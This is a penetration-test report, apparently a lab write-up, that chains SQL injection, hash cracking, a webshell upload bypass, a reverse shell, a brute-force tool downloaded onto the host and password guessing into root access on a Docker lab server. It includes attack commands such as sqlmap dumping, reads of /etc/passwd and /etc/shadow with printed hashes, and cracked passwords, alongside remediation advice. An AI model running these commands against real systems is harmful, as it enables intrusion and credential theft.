# Offensive Security Assessment Report

**Scope:** Offensive security assessment -- Apple Store web application  
**Target IP:** 172.17.0.2

---

# 1. Executive Summary

A full offensive security assessment was carried out, identifying a chain of critical vulnerabilities that led to the complete compromise of the server. Through a methodical process of reconnaissance, enumeration, and exploitation, it was possible to escalate from a web user to **ROOT** privileges on the system.

**Main Findings:**

- Critical SQL Injection -- complete database exfiltration.
- 4 hashes extracted -- 3 passwords cracked.
- Admin panel compromised -- 1,250 users exposed.
- RCE confirmed -- reverse shell as `www-data`.
- Privilege escalation to user -- `luisillo_o:19831983`.
- ROOT obtained -- `root:rainbow2`.

**Total Impact:** COMPLETE ABSOLUTE COMPROMISE -- ROOT ACCESS ON THE SERVER -- MASS DATA BREACH

**Risk Level:** CRITICAL

---

# 2. Phase 1: Reconnaissance

## 2.1 Finding #1 -- ICMP Connectivity Enabled

**Severity:** LOW  
**ID:** FIND-001

**Description:**  
After starting the assessment, the first step was to verify connectivity with the target. A basic ping was executed, confirming that the host was active and accessible from my machine.

**Command:**

```bash
ping 172.17.0.2
```

```text
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.667 ms
5 packets transmitted, 5 received, 0% packet loss
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/094c7eb6-1ac6-4521-a9fc-9c2267c9e931" />

**Recommendation:**

- Block ICMP in the firewall.
- Segment the Docker network.

## 2.2 Finding #2 -- Port Scan (Nmap)

**Severity:** MEDIUM-HIGH  
**ID:** FIND-002

**Description:**  
Once connectivity was confirmed, I performed a full port scan with Nmap to identify exposed services. The scan revealed only port 80 open with Apache.

**Command:**

```bash
nmap -sS --open -sC -sV -n -Pn 172.17.0.2
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.58 (Ubuntu)
_http-title: Apple Store
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/82f0d646-1130-4a4f-9406-30a9649be155" />

**Recommendation:**

- Hide the Apache version.
- Implement a WAF.
- Force HTTPS.

## 2.3 Finding #3 -- Web Fingerprinting

**Severity:** MEDIUM  
**ID:** FIND-003

**Description:**  
With port 80 identified, I used WhatWeb to gather detailed information about the technology stack. The analysis revealed Apache, Bootstrap, and Ubuntu as the base technologies.

**Command:**

```bash
whatweb http://172.17.0.2
```

```text
Apache[2.4.58], Bootstrap, HTML5, Ubuntu Linux, Title[Apple Store]
```

<img width="1806" height="458" alt="image" src="https://github.com/user-attachments/assets/819c58c4-92a2-4847-9c5d-0a1447afa187" />

**Recommendation:**

- Obfuscate HTTP headers.
- Implement CSP.

---

# 3. Phase 2: Enumeration

## 3.1 Finding #4 -- Interface Analysis

**Severity:** MEDIUM  
**ID:** FIND-004

**Description:**  
I accessed the web application manually to analyze its behavior. After browsing the interface and inspecting the code with DevTools, I identified the login form, the registration form, and the search functionality as key entry points.

*[4: Normal interface]*

<img width="1808" height="774" alt="image" src="https://github.com/user-attachments/assets/5e315ec0-460a-4f1d-a6b9-db669ee61338" />

Login

<img width="1792" height="844" alt="image" src="https://github.com/user-attachments/assets/d379948b-35ad-4c25-96ab-09dd207071bc" />

**Recommendation:**

- Obfuscate JavaScript.
- Use secure cookie flags.

## 3.2 Finding #5 -- Directory Fuzzing

**Severity:** HIGH  
**ID:** FIND-005

**Description:**  
After the manual analysis, I ran ffuf to search for hidden directories. After several minutes of scanning, I found critical exposed resources including `login.php`, `register.php`, and the `uploads/` directory.

**Command:**

```bash
ffuf -u http://172.17.0.2/FUZZ -w raft-small-directories.txt -fs 275
```

**Resources:**

| Resource | Status | Risk |
|---|---|---|
| login.php | 200 | Critical |
| register.php | 200 | High |
| uploads/ | 301 | High |

*[ffuf output]*

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8a2f3aa2-6980-4298-9c2b-d4835abf0d5a" />

**Recommendation:**

- Restrict access to `uploads/`.
- Add rate limiting to login.
- Disable directory listing.

## 3.3 Finding #6 -- Successful Registration and Login

**Severity:** CRITICAL  
**ID:** FIND-007

**Description:**  
Once the authentication endpoints were identified, I tested the full flow. I registered with controlled credentials and then logged in successfully, confirming that there was no MFA or account lockout policy.

*[#8: Registration]*

<img width="1810" height="729" alt="image" src="https://github.com/user-attachments/assets/71e4ffe5-fe6e-400b-955c-19568f6cb414" />

<img width="1659" height="595" alt="image" src="https://github.com/user-attachments/assets/5f2bb496-33f0-4e5f-a034-0fcfc86b6671" />

<img width="1814" height="872" alt="image" src="https://github.com/user-attachments/assets/77831bd4-a902-4841-86f7-8b870b35118b" />

**Recommendation:**

- Implement MFA.
- Add account lockout.
- Enforce session timeout.

---

# 4. Phase 3: Exploitation

## 4.1 Finding #7 -- SQL Injection in `mycart.php`

**Severity:** CRITICAL  
**ID:** FIND-008

**Description:**  
After logging in, I reviewed the application with Burp Suite to identify possible attack vectors, including privilege escalation attempts, although the user I was working with did not have permissions to perform administrative actions or upload content to the site. During the application analysis, I explored different configurations and functions, without finding anything relevant related to privilege escalation.

Later, I detected a search bar that worked as a query system over a database table. From that point, I analyzed the associated parameter and identified a time-based SQL injection issue. Exploiting this vulnerability made it possible to access and extract the entire contents of the database.

**Command:**

```bash
sqlmap -r peticion3 --dbs --batch --dump
```

**Results:**

- 5 databases exfiltrated.
- 4 SHA1 hashes extracted.
- 3 passwords cracked.

| User | Hash | Password |
|---|---|---|
| admin | 7f73ae7a\... | 0844575632 |
| test | a94a8fe5\... | test |
| manolo | 7110eda4\... | 1234 |

*[#11: Burp request]*

<img width="1638" height="744" alt="image" src="https://github.com/user-attachments/assets/59120c42-22d7-4635-9fc9-655d622e89f0" />

*[#12: sqlmap injection]*

<img width="1607" height="558" alt="image" src="https://github.com/user-attachments/assets/bb0a60c4-5402-4386-9602-f4fcf4bf0239" />

<img width="1606" height="768" alt="image" src="https://github.com/user-attachments/assets/ee7e652e-df02-4b89-9347-b69264fecf02" />

**Recommendation:**

- Use prepared statements (PDO).
- Rotate sessions.
- Migrate to Argon2id.

## 4.2 Finding #8 -- Admin Password Cracking

**Severity:** CRITICAL  
**ID:** FIND-009

**Description:**  
With the extracted hashes, I submitted the administrator hash to CrackStation. In less than 5 seconds, I obtained the plaintext password thanks to rainbow tables.

**Result:**

```text
admin:0844575632
Time: <5 seconds
```

#14: CrackStation hash

<img width="1639" height="802" alt="image" src="https://github.com/user-attachments/assets/ab52a5fd-c53a-4f5b-bf20-69dd8946da6f" />

**Recommendation:**

- Force password resets.
- Enforce a robust password policy.

## 4.3 Finding #9 -- Administrative Panel

**Severity:** CRITICAL  
**ID:** FIND-010

**Description:**  
I used the cracked credentials to access the administrative panel. Once inside, I found sensitive data for 1,250 users, recent orders, and complete sales statistics.

**Exposed data:**

- 1,250 users
- 320 products
- 42 pending orders

*Admin dashboard*

<img width="1633" height="656" alt="image" src="https://github.com/user-attachments/assets/c66e57e6-cf75-4d60-8012-b47ed36df946" />

*[#17: Orders]*

<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/939f3cf3-74f4-491c-b4dd-273c7630e47a" />

**Recommendation:**

- Notify the data protection authority within 72h under GDPR.
- Audit admin actions.

## 4.4 Finding #10 -- RCE via File Upload

**Severity:** CRITICAL  
**ID:** FIND-011

**Description:**  
While exploring the panel, I found the file upload option in Settings. I initially tried uploading a `.php` file but it was blocked. I intercepted the request with Burp Suite, changed the extension to `.phtml`, and managed to bypass the filter. After 3 attempts (`shell.phtml`, `shell2.phtml`), the third webshell (`shell3.phtml`) of 76 bytes was successful.

**Uploaded webshells:**

| File | Size | Status |
|---|---|---|
| shell.phtml | 515B | Partial |
| shell2.phtml | 2.6K | Improved |
| shell3.phtml | 76B | SUCCESS |

*#18: Burp bypass*

<img width="1472" height="735" alt="image" src="https://github.com/user-attachments/assets/701fa05a-c4aa-43b6-b446-77e3547cc321" />

<img width="1481" height="726" alt="image" src="https://github.com/user-attachments/assets/e6e2d804-1a20-4c96-853b-01fd93abb5bf" />

**Recommendation:**

- Disable file uploads.
- Use an extension allowlist.
- Disable PHP execution in `uploads/`.

## 4.5 Finding #11 -- Reverse Shell

**Severity:** CRITICAL  
**ID:** FIND-012

**Description:**  
With the webshell working, I established a reverse shell to my machine. I started netcat listening on port 4444 and executed the payload from the webshell, obtaining interactive access as `www-data`.

**Command:**

```bash
nc -lvnp 4444
```

```text
connect to [192.168.0.16] from [172.17.0.2]
www-data@25716eb13389:~$ script -c bash /dev/null
```

*Reverse shell*

<img width="1461" height="610" alt="image" src="https://github.com/user-attachments/assets/e6a25338-f073-459b-ab36-ac0b55bf808a" />

*[#21: TTY upgrade]*

<img width="1446" height="705" alt="image" src="https://github.com/user-attachments/assets/94bd9efe-1a35-4003-9ba5-e12c655fcab8" />

**Recommendation:**

- Isolate the container.
- Kill suspicious processes.
- Monitor outbound connections.

---

# 5. Phase 4: Post-Exploitation

## 5.1 Finding #12 -- User Enumeration

**Severity:** CRITICAL  
**ID:** FIND-013

**Description:**  
Once inside as `www-data`, the system enumeration phase began in order to identify possible privilege escalation paths. After reviewing the web application and different configuration files, no exposed credentials or sensitive information were found in the source code or in web-accessible resources, including standard application configurations.

Since no relevant information was found at the application level, enumeration was expanded to the system environment, identifying local user information. During this process, the existence of a system user was detected, which proved relevant for continuing the analysis and possible later privilege escalation steps.

**Command:**

```bash
cat /etc/passwd
```

```text
luisillo_o:x:1001:1001::/home/luisillo_o:/bin/sh
```

<img width="1470" height="701" alt="image" src="https://github.com/user-attachments/assets/8fd4aa97-cfac-4e1b-b50d-94ff707c0124" />

**Recommendation:**

- Audit users.
- Enforce least privilege.

## 5.2 Finding #13 -- Downloaded Tools

**Severity:** HIGH  
**ID:** FIND-014

**Description:**  
With `luisillo_o` identified as the target, I needed brute-force tools. I downloaded `rockyou.txt` and `su-bruteforce` directly onto the server to run the attack locally.

**Command:**

```bash
cd /tmp
wget https://github.com/carlospolop/su-bruteforce/archive/master.zip
unzip master.zip
```

<img width="1467" height="717" alt="image" src="https://github.com/user-attachments/assets/ee022e46-f91c-424c-a347-dcf7608eeb0f" />

<img width="1457" height="464" alt="image" src="https://github.com/user-attachments/assets/544ad0ef-d54d-4f3e-a9cb-be901a5c6f50" />

**Recommendation:**

- Block internet egress.
- Monitor downloads.

## 5.3 Finding #14 -- Successful Brute Force

**Severity:** CRITICAL  
**ID:** FIND-015

**Description:**  
I ran `su-bruteforce` against `luisillo_o` with `rockyou.txt`. After several minutes of brute forcing, the tool found the password: `19831983` (repeated year pattern).

**Command:**

```bash
./suBF.sh -u luisillo_o -w ../rockyou.txt
```

```text
Password: 19831983
```

<img width="1468" height="695" alt="image" src="https://github.com/user-attachments/assets/77f53d26-5bef-4870-bf71-072cad02fc27" />

<img width="1472" height="695" alt="image" src="https://github.com/user-attachments/assets/04f7160b-691a-43c8-b9c7-7277cfc190e6" />

**Recommendation:**

- Add account lockout.
- Enforce MFA for SSH.
- Require passwords of 16+ characters.

---

# 6. Phase 5: Privilege Escalation

## 6.1 Finding #15 -- Readable `/etc/shadow`

**Severity:** CRITICAL  
**ID:** FIND-016

**Description:**  
Now as `luisillo_o`, I tried to read `/etc/shadow`, expecting it to be locked down. To my surprise, I had read permissions due to a critical misconfiguration, allowing me to extract the hashes for root and for the user itself.

**Command:**

```bash
cat /etc/shadow
```

```text
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07
luisillo_o:$y$j9T$jeXc8lTJhOBTedetDcKHI/$Bo6qPkbZFVsfWoTJvAZ1x0t2jG3aGsHjOjxkqOpBGg6
```

<img width="1470" height="733" alt="image" src="https://github.com/user-attachments/assets/8bf2a258-fd18-4a2c-9a9d-55902f5960eb" />

**Recommendation:**

- Set `/etc/shadow` permissions to `640`.
- Audit the `shadow` group.

## 6.2 Finding #16 -- ROOT Obtained

**Severity:** CRITICAL MAXIMUM  
**ID:** FIND-017

**Description:**  
With full system access, I attempted to escalate to root. Based on the weak password pattern observed (`19831983`), I tried simple combinations. After several failed attempts, I tried `"rainbow2"` and it worked, granting full root access.

**Command:**

```bash
su - root
```

```text
Password: rainbow2
root@25716eb13389:~# whoami
root
root@25716eb13389:~# id
uid=0(root) gid=0(root) groups=0(root)
```

<img width="1446" height="698" alt="image" src="https://github.com/user-attachments/assets/06c0c49c-b56a-44e6-a83b-681e5350a24f" />

<img width="1456" height="647" alt="image" src="https://github.com/user-attachments/assets/69f08b43-b383-46ea-bf99-b79001635c17" />

**Recommendation:**

- Change the root password immediately.
- Invalidate SSH keys.
- Rebuild the server.

---

# 7. Impact Summary

| Category | Status | Severity |
|---|---|---|
| SQL Injection | Exploited | CRITICAL |
| Admin Panel | Compromised | CRITICAL |
| RCE | Confirmed | CRITICAL |
| User | Compromised | CRITICAL |
| ROOT | Obtained | CRITICAL MAXIMUM |

---

# 8. Priority Recommendations

## Critical (0-24h)

1. Isolate the server immediately.
2. Change the root password urgently.
3. Invalidate all SSH keys.
4. Patch SQLi with prepared statements.
5. Notify the data protection authority within 72h under GDPR.

## High (1-7 days)

1. Rebuild the server from scratch.
2. Implement mandatory MFA.
3. Migrate hashing to Argon2id.
4. Deploy WAF + EDR.

## Medium (1-4 weeks)

1. Implement a secure SDLC.
2. Provide OWASP Top 10 training.
3. Start a bug bounty program.

---

# 9. Conclusions

The assessment demonstrated that chained critical vulnerabilities led to a total compromise. From an initial ping to ROOT, the entire process took approximately 52 hours of methodical work.

**Key Vulnerabilities Exploited:**

1. Authenticated SQL Injection.
2. Weak passwords (`admin:0844575632`, `root:rainbow2`).
3. File upload without proper validation.
4. Incorrect permissions on `/etc/shadow`.
5. Complete absence of MFA.

**Business Impact:**

- 1,250 users with exposed PII data.
- Total control of the compromised server.
- Significant legal risk under GDPR/LOPDGDD.
- Possible lateral movement to other systems.

**Lessons Learned:**

- Security must be implemented in layers (defense in depth).
- Weak passwords can compromise the entire infrastructure.
- Input validation is critical at every layer.
- Continuous monitoring is essential to detect attacks early.
